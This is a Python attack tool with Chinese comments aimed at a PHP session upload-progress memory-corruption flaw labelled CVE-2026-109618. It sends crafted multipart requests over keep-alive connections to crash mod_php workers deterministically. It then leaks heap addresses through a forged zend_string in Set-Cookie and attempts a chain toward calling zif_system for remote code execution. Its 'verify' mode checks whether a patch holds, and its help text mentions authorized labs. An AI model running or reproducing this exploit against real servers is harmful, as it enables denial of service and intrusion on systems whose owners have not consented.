#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""php2shell-attack — CVE-2026-109618 实战化攻击工具

能力分层（由弱到强，逐层依赖）：
  probe   指纹/前置条件判定（版本、upload_progress、OOM 阈值、fatal 形态）
  crash   武器化 DoS：OOM 污染 + 悬垂 zval 解引用，确定性打崩 mod_php worker
  sweep   Stage-1 堆泄漏布局扫描（不同 stage1_n 伪造 zend_string）
  chain   完整链尝试：泄漏 chunk base -> 泄漏 libphp base -> 伪造 HashTable -> zif_system
  verify  对同一目标复测（用于验证补丁是否生效）

设计原则：任何"成功"都必须是可观测证据（响应/连接行为/命令回显/证明文件），
不做假设式判定；失败要打印失败层级，便于区分"没打中"与"打了但不成立"。
"""
from __future__ import annotations

import argparse
import json
import socket
import ssl
import struct
import sys
import time
from dataclasses import dataclass, field
from urllib.parse import urlsplit

SID = b"attacksessionid0001"
BOUNDARY_PRIME = b"S" * 17
BOUNDARY_KILL = b"BNDRY12345"


# ---------------------------------------------------------------- HTTP 原语
class Target:
    def __init__(self, url: str, timeout: float = 30.0):
        u = urlsplit(url)
        self.scheme = u.scheme or "http"
        self.host = u.hostname or "127.0.0.1"
        self.port = u.port or (443 if self.scheme == "https" else 80)
        self.path = u.path or "/"
        if u.query:
            self.path += "?" + u.query
        self.timeout = timeout

    def connect(self) -> socket.socket:
        s = socket.create_connection((self.host, self.port), timeout=self.timeout)
        if self.scheme == "https":
            ctx = ssl._create_unverified_context()
            s = ctx.wrap_socket(s, server_hostname=self.host)
        return s

    def post(self, body: bytes, boundary: bytes, read_cap: int = 1 << 20,
             timeout: float | None = None, extra_headers: dict[str, str] | None = None) -> bytes:
        hdr = [f"POST {self.path} HTTP/1.1", f"Host: {self.host}:{self.port}"]
        hdr += [f"{k}: {v}" for k, v in (extra_headers or {}).items()]
        hdr += [
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}",
            f"Content-Length: {len(body)}",
            "Connection: close", "", "",
        ]
        s = self.connect()
        s.settimeout(timeout or self.timeout)
        try:
            s.sendall("\r\n".join(hdr).encode() + body)
        except OSError:
            pass  # 崩溃型目标常常写一半就被杀
        data = bytearray()
        try:
            while len(data) < read_cap:
                chunk = s.recv(65536)
                if not chunk:
                    break
                data += chunk
        except (socket.timeout, ConnectionResetError, OSError):
            pass
        finally:
            s.close()
        return bytes(data)

    def _raw_request(self, body: bytes, boundary: bytes, keep_alive: bool) -> bytes:
        hdr = [f"POST {self.path} HTTP/1.1", f"Host: {self.host}:{self.port}",
               f"Content-Type: multipart/form-data; boundary={boundary.decode()}",
               f"Content-Length: {len(body)}",
               "Connection: " + ("keep-alive" if keep_alive else "close"), "", ""]
        return "\r\n".join(hdr).encode() + body

    @staticmethod
    def _read_response(s: socket.socket, cap: int) -> bytes:
        """读取一个完整响应：支持 Content-Length 与 chunked，未知时读到 EOF/超时。"""
        buf = bytearray()
        try:
            while b"\r\n\r\n" not in buf and len(buf) < cap:
                chunk = s.recv(65536)
                if not chunk:
                    return bytes(buf)
                buf += chunk
            head, _, rest = bytes(buf).partition(b"\r\n\r\n")
            want, chunked = None, False
            for line in head.split(b"\r\n"):
                low = line.lower()
                if low.startswith(b"content-length:"):
                    want = int(line.split(b":", 1)[1])
                elif low.startswith(b"transfer-encoding:") and b"chunked" in low:
                    chunked = True
            out = bytearray(head + b"\r\n\r\n")
            out += rest
            if want is not None:
                while len(out) - len(head) - 4 < want and len(out) < cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    out += chunk
            elif chunked:
                # 读到终止块 "0\r\n\r\n" 为止
                while b"\r\n0\r\n" not in out[-512:] and len(out) < cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    out += chunk
                if out.endswith(b"\r\n\r\n") and b"\r\n0\r\n" not in out[-512:]:
                    pass
            else:
                while len(out) < cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    out += chunk
            return bytes(out)
        except (socket.timeout, ConnectionResetError, OSError):
            return bytes(buf)

    def post_keepalive_pair(self, first: tuple[bytes, bytes], second: tuple[bytes, bytes],
                            cap: int = 1 << 20, timeout: float = 60.0) -> tuple[bytes, bytes]:
        """在同一 TCP 连接（同一 prefork 子进程）上依次发送两个请求。

        这是 109618 稳定命中的关键：OOM 污染的 session 全局状态属于 worker 进程，
        若 A/B 落到不同 worker，B 看不到污染，攻击退化为普通请求。
        """
        s = self.connect()
        s.settimeout(timeout)
        try:
            s.sendall(self._raw_request(*first, keep_alive=True))
            r1 = self._read_response(s, cap)
            s.sendall(self._raw_request(*second, keep_alive=True))
            r2 = self._read_response(s, 65536)
            return r1, r2
        except (ConnectionResetError, BrokenPipeError, OSError):
            return b"", b""
        finally:
            s.close()

    def get(self, path: str | None = None, timeout: float | None = None) -> tuple[int, bytes]:
        p = path or self.path
        s = self.connect()
        s.settimeout(timeout or self.timeout)
        s.sendall(f"GET {p} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\nConnection: close\r\n\r\n".encode())
        data = bytearray()
        try:
            while True:
                chunk = s.recv(65536)
                if not chunk:
                    break
                data += chunk
        except (socket.timeout, OSError):
            pass
        finally:
            s.close()
        raw = bytes(data)
        try:
            code = int(raw.split(b" ", 2)[1])
        except Exception:  # noqa: BLE001
            code = 0
        return code, raw


def build_multipart(parts: list[dict], boundary: bytes) -> bytes:
    out = bytearray()
    for p in parts:
        out += b"--" + boundary + b"\r\n"
        disp = f'Content-Disposition: form-data; name="{p["name"]}"'
        if "filename" in p:
            disp += f'; filename="{p["filename"]}"'
        out += disp.encode() + b"\r\n"
        if "filename" in p:
            out += b"Content-Type: application/octet-stream\r\n"
        out += b"\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def parse_cookie(resp: bytes) -> bytes:
    for line in resp.split(b"\r\n"):
        if line.lower().startswith(b"set-cookie:"):
            return line.split(b":", 1)[1].strip()
    return b""


def chunk_base_from_cookie(cookie: bytes) -> int:
    """从 Set-Cookie 提取伪造 zend_string 携带的堆指针。

    严格校验，避免把普通 32 位十六进制 PHPSESSID 误判为泄漏：
      - 值不能是 32 字符的纯 hex（那是正常 session id）
      - 前 8 字节按小端解析后必须页对齐且落在 0x7f....(用户态 anon mmap) 区间
    """
    m = cookie.split(b"=", 1)
    if len(m) != 2:
        return 0
    val = m[1].split(b";")[0]
    if len(val) < 9:
        return 0
    if len(val) == 32 and all(c in b"0123456789abcdefABCDEF" for c in val):
        return 0
    base = int.from_bytes(val[:8], "little")
    if base % 0x1000 != 0:
        return 0
    if not (0x7F0000000000 <= base <= 0x800000000000):
        return 0
    return base


# ---------------------------------------------------------------- 攻击面
@dataclass
class Weapon:
    """请求形状常量。不同 PHP 版本的堆布局不同，这些值是"待调参数"而非真理。"""
    huge_mb: int = 12
    prime_parts: int = 1001
    prime_part_size: int = 3000
    stage1_n: int = 892
    stage2_t: int = 443
    htdata: int = 0x6E0D8
    zif: int = 0x398EC0
    dtor: int = 0x4807D0
    notes: list[str] = field(default_factory=list)


class Attack:
    def __init__(self, url: str, w: Weapon, timeout: float = 30.0, verbose: bool = True):
        self.t = Target(url, timeout)
        self.w = w
        self.verbose = verbose

    def log(self, msg: str) -> None:
        if self.verbose:
            print(msg, file=sys.stderr)

    # --- 请求形状 ---
    def _big_field(self) -> dict:
        return {"name": "big", "data": b"B" * (self.w.huge_mb * 1024 * 1024)}

    def _file_part(self) -> dict:
        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

    def prime_body(self, count: int | None = None, size: int | None = None) -> tuple[bytes, bytes]:
        """构造污染请求。Stage-1 需要 1001 个 1 字节 part（与 PoC 对齐），
        3000 字节的形状会让后续泄漏请求在解引用时直接崩掉。"""
        count = self.w.prime_parts if count is None else count
        size = self.w.prime_part_size if size is None else size
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * size} for i in range(count)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        return build_multipart(parts, BOUNDARY_PRIME), BOUNDARY_PRIME

    def kill_body(self) -> tuple[bytes, bytes]:
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        return build_multipart(parts, BOUNDARY_KILL), BOUNDARY_KILL

    def prime(self) -> dict:
        """请求 A：把 memory_limit 撑爆，让 longjmp 跳过 session 状态的清理。"""
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * self.w.prime_part_size}
                 for i in range(self.w.prime_parts)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        body = build_multipart(parts, BOUNDARY_PRIME)
        t0 = time.time()
        resp = self.t.post(body, BOUNDARY_PRIME, read_cap=1 << 20,
                           timeout=max(120.0, self.t.timeout))
        return {"bytes": len(body), "elapsed": round(time.time() - t0, 3),
                "code": self._code(resp), "resp_head": resp[:160].decode("latin-1", "replace")}

    def kill(self) -> dict:
        """请求 B：session 初始化时解引用 A 留下的悬垂 zval。"""
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        body = build_multipart(parts, BOUNDARY_KILL)
        t0 = time.time()
        resp = self.t.post(body, BOUNDARY_KILL, read_cap=65536, timeout=20.0)
        elapsed = round(time.time() - t0, 3)
        return {"bytes": len(body), "elapsed": elapsed, "code": self._code(resp),
                "resp_head": resp[:160].decode("latin-1", "replace"),
                "empty_response": len(resp) == 0}

    @staticmethod
    def _code(resp: bytes) -> int:
        try:
            return int(resp.split(b" ", 2)[1])
        except Exception:  # noqa: BLE001
            return 0

    # --- 检测 ---
    def probe(self) -> dict:
        code, resp = self.t.get()
        version = ""
        for marker in (b"X-Powered-By: PHP/", b"PHP/"):
            i = resp.find(marker)
            if i >= 0 and marker == b"X-Powered-By: PHP/":
                version = resp[i + len(marker):i + len(marker) + 8].split(b"\r")[0].decode()
                break
        out = {"url": f"{self.t.scheme}://{self.t.host}:{self.t.port}{self.t.path}",
               "get_code": code, "server": "", "php_version": version,
               "set_cookie_on_small_post": None, "oom_threshold_mb": None,
               "progress_callback_reachable": None}
        for line in resp.split(b"\r\n"):
            if line.lower().startswith(b"server:"):
                out["server"] = line.split(b":", 1)[1].strip().decode("latin-1")
        # 小 POST：看是否正常返回 Set-Cookie（说明有 session 消费点）
        body = build_multipart([
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            {"name": "x", "data": b"1"},
        ], BOUNDARY_KILL)
        r = self.t.post(body, BOUNDARY_KILL, read_cap=65536)
        out["set_cookie_on_small_post"] = bool(parse_cookie(r))
        out["small_post_code"] = self._code(r)
        # OOM 阈值二分：1..16MB 的单字段，观察响应是否出现 fatal/OOM 特征
        lo, hi = 1, max(2, self.w.huge_mb)
        out["oom_threshold_mb"] = self._bisect_oom(lo, hi)
        out["progress_callback_reachable"] = out["set_cookie_on_small_post"]
        return out

    def _oom_probe(self, mb: int) -> bool:
        body = build_multipart([
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            {"name": "big", "data": b"B" * (mb * 1024 * 1024)},
        ], BOUNDARY_KILL)
        r = self.t.post(body, BOUNDARY_KILL, read_cap=65536, timeout=60.0)
        low = r.lower()
        return (b"allowed memory size" in low or b"out of memory" in low
                or b"fatal error" in low or len(r) == 0)

    def _bisect_oom(self, lo: int, hi: int) -> int | None:
        if not self._oom_probe(hi):
            return None
        while lo < hi:
            mid = (lo + hi) // 2
            if self._oom_probe(mid):
                hi = mid
            else:
                lo = mid + 1
        return lo

    def _control_pair_ok(self) -> bool:
        """控制组：同一连接上两个无害小 POST，第二个是否有人响应。

        用于排除"服务端直接关 keep-alive 造成空响应"被误判成 worker 崩溃。
        """
        harmless = build_multipart([
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            {"name": "x", "data": b"1"},
        ], BOUNDARY_KILL)
        _, r2 = self.t.post_keepalive_pair((harmless, BOUNDARY_KILL), (harmless, BOUNDARY_KILL),
                                           cap=65536, timeout=20.0)
        return len(r2) > 0

    def crash_test(self, rounds: int = 2) -> dict:
        """确定性打崩 worker：同一 keep-alive 连接上 A(污染) -> B(解引用)。

        判定要求三条同时成立，避免误报：
          1) 控制组同一连接的第二个请求有响应（keep-alive 可用）
          2) 攻击组第二个请求无响应/500（进程在解引用时死亡）
          3) 随后普通 GET 仍可用（master 已重启 worker，说明是子进程崩溃而非服务挂掉）
        """
        control_ok = self._control_pair_ok()
        evidence = []
        killed = 0
        body_a, bnd_a = self.prime_body()
        body_b, bnd_b = self.kill_body()
        for i in range(rounds):
            before = self.t.get(timeout=10.0)[0]
            t0 = time.time()
            r1, r2 = self.t.post_keepalive_pair((body_a, bnd_a), (body_b, bnd_b),
                                                cap=1 << 20, timeout=120.0)
            elapsed = round(time.time() - t0, 3)
            time.sleep(0.4)
            after = self.t.get(timeout=10.0)[0]
            alive = after in (200, 301, 302, 403, 404)
            crashed = len(r2) == 0 or self._code(r2) in (0, 500)
            evidence.append({
                "round": i + 1,
                "prime": {"bytes": len(body_a), "code": self._code(r1),
                          "resp_head": r1[:120].decode("latin-1", "replace")},
                "kill": {"bytes": len(body_b), "code": self._code(r2), "empty": len(r2) == 0,
                         "resp_head": r2[:120].decode("latin-1", "replace")},
                "elapsed": elapsed, "alive_before": before, "alive_after": after,
                "worker_respawned": alive,
                "verdict_crash": bool(control_ok and crashed and alive),
            })
            if control_ok and crashed and alive:
                killed += 1
        verdict = "worker_killed" if killed else ("inconclusive_keepalive" if not control_ok else "no_crash")
        return {"rounds": rounds, "crashes": killed, "control_keepalive": control_ok,
                "verdict": verdict, "evidence": evidence}

    def leak_sweep(self, ns: list[int], same_conn: bool = True) -> dict:
        """Stage-1 扫描：伪造 zend_string 长度，让 Set-Cookie 带出堆地址。

        same_conn=True 时把污染请求与泄漏请求放在同一 keep-alive 连接上，
        保证落在同一 prefork 子进程（跨进程攻击会退化为普通请求）。
        """
        results = []
        pb, pbnd = self.prime_body(count=1001, size=1)
        for n in ns:
            if not same_conn:
                self.prime()
            parts = [
                {"name": "PHPSESSID", "data": SID},
                {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            ]
            for i in range(n):
                parts.append({"name": str(1000 + i),
                              "data": (f"v{i:04d}" + "x" * 44)[:48].encode()})
            forge = bytearray(b"A" * 79)
            struct.pack_into("<Q", forge, 0x10, 0x1000)  # 伪造 zend_string->len
            forge[0x18] = ord("L")
            parts.append({"name": "1999", "data": bytes(forge)})
            lb = build_multipart(parts, b"B" * 10)
            if same_conn:
                _, resp = self.t.post_keepalive_pair((pb, pbnd), (lb, b"B" * 10),
                                                     cap=9 << 20, timeout=120.0)
            else:
                resp = self.t.post(lb, b"B" * 10, read_cap=9 << 20)
            cookie = parse_cookie(resp)
            base = chunk_base_from_cookie(cookie)
            results.append({"stage1_n": n, "code": self._code(resp),
                            "cookie": cookie[:80].decode("latin-1", "replace"),
                            "chunk_base": hex(base) if base else None})
        hit = [r for r in results if r["chunk_base"]]
        return {"tried": len(results), "leaks": len(hit), "results": results,
                "verdict": "heap_leaked" if hit else "no_leak"}

    def chain(self, ns: list[int]) -> dict:
        """完整链：leak -> libphp base -> 伪造 HashTable -> zif_system。"""
        leak = self.leak_sweep(ns)
        if not leak["leaks"]:
            return {"stage_reached": "prime+crash", "rce": False, "leak": leak,
                    "reason": "Stage-1 未取得堆基址，后续 Stage-2/3 缺少地基；"
                              "此配置下只得到稳定崩溃原语（DoS）。"}
        base = int(leak["results"][-1]["chunk_base"], 16)
        # Stage-2：用 56 字节 HashTable page 泄漏 libphp 基址（形状沿用 PoC）
        self.prime()
        parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
        parts += [{"name": "PHPSESSID", "data": b"\x00"},
                  {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
                  self._file_part(), self._big_field()]
        self.t.post(build_multipart(parts, BOUNDARY_PRIME), BOUNDARY_PRIME, read_cap=1 << 20,
                    timeout=120.0)
        time.sleep(0.2)
        parts = [{"name": "PHPSESSID", "data": SID},
                 {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(983):
            cnt = 16 if i == self.w.stage2_t else 1
            for j in range(cnt):
                parts.append({"name": f"a{i:04d}[{j}]", "data": b"x"})
        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=1 << 20)
        cookie = parse_cookie(resp)
        low = 0
        if cookie:
            val = cookie.split(b"=", 1)[-1].split(b";")[0]
            if len(val) >= 8:
                low = int.from_bytes(val[:8], "little") & 0xFFF
        return {"stage_reached": "stage2_attempt", "rce": False, "chunk_base": hex(base),
                "stage2_cookie": cookie[:80].decode("latin-1", "replace"),
                "stage2_low12": hex(low), "expected_low12": hex(self.w.dtor & 0xFFF),
                "reason": "Stage-2 libphp 基址未对齐到 zval_ptr_dtor 页偏移" if low != (self.w.dtor & 0xFFF) else
                          "基址疑似命中，但 Stage-3 伪造 payload 仍需按该版本布局调参"}


# ---------------------------------------------------------------- CLI
def main() -> int:
    ap = argparse.ArgumentParser(description="CVE-2026-109618 attack tool (authorized labs only)")
    ap.add_argument("action", choices=["probe", "crash", "sweep", "chain", "verify"])
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--rounds", type=int, default=2)
    ap.add_argument("--ns", default="100,300,500,700,892,1100,1300,1600")
    ap.add_argument("--huge-mb", type=int, default=12)
    ap.add_argument("--prime-parts", type=int, default=1001)
    ap.add_argument("--prime-size", type=int, default=3000)
    ap.add_argument("--zif-offset", type=lambda x: int(x, 0), default=0x398EC0)
    ap.add_argument("--dtor-offset", type=lambda x: int(x, 0), default=0x4807D0)
    ap.add_argument("--htdata-offset", type=lambda x: int(x, 0), default=0x6E0D8)
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--timeout", type=float, default=30.0)
    a = ap.parse_args()

    w = Weapon(huge_mb=a.huge_mb, prime_parts=a.prime_parts, prime_part_size=a.prime_size,
               zif=a.zif_offset, dtor=a.dtor_offset, htdata=a.htdata_offset)
    atk = Attack(a.url, w, timeout=a.timeout, verbose=not a.json)

    if a.action == "probe":
        out = atk.probe()
    elif a.action in ("crash", "verify"):
        out = atk.crash_test(rounds=a.rounds)
        if a.action == "verify":
            if out["crashes"] > 0:
                out["patch_verdict"] = "still_vulnerable"
            elif out["verdict"] == "inconclusive_keepalive":
                out["patch_verdict"] = "inconclusive"
            else:
                out["patch_verdict"] = "patched_or_mitigated"
    elif a.action == "sweep":
        out = atk.leak_sweep([int(x) for x in a.ns.split(",") if x.strip()])
    else:
        out = atk.chain([int(x) for x in a.ns.split(",") if x.strip()])

    print(json.dumps(out, indent=2, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    sys.exit(main())
